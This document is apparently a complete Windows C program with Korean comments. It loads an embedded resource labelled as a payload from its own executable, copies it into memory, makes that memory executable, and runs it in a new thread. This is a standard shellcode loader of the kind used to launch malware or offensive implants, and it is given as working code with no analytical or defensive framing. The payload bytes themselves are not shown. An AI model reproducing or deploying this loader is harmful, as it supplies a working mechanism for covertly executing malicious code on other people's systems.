#include <windows.h>

/* payload.rc에 정의된 RCDATA 리소스 번호 */
#define PAYLOAD_ID 101

int main(void) {
    /* 실행 파일 내부에서 PAYLOAD_ID에 해당하는 RCDATA 리소스를 찾는다. */
    HRSRC resource = FindResourceA(
        NULL,
        MAKEINTRESOURCEA(PAYLOAD_ID),
        RT_RCDATA
    );
    HGLOBAL loaded;
    HANDLE thread;
    DWORD size, old_protect;
    void *data, *memory;

    if (!resource) return 1;

    /* 리소스의 크기와 메모리상 주소를 가져온다. */
    size = SizeofResource(NULL, resource);
    loaded = LoadResource(NULL, resource);
    data = LockResource(loaded);
    if (!size || !loaded || !data) return 1;

    /* 페이로드를 복사할 읽기/쓰기 가능한 메모리를 할당한다. */
    memory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!memory) return 1;

    /* 리소스 데이터를 새로 할당한 메모리로 복사한다. */
    CopyMemory(memory, data, size);

    /* 복사가 끝난 메모리를 읽기/실행 권한으로 변경한다. */
    if (!VirtualProtect(memory, size, PAGE_EXECUTE_READ, &old_protect)) {
        VirtualFree(memory, 0, MEM_RELEASE);
        return 1;
    }

    /* CPU 명령어 캐시를 갱신한 뒤 해당 주소에서 새 스레드를 시작한다. */
    FlushInstructionCache(GetCurrentProcess(), memory, size);
    thread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)memory,
        NULL,
        0,
        NULL
    );
    if (!thread) {
        VirtualFree(memory, 0, MEM_RELEASE);
        return 1;
    }

    /* 스레드가 끝날 때까지 기다린 후 핸들과 메모리를 정리한다. */
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFree(memory, 0, MEM_RELEASE);
    return 0;
}
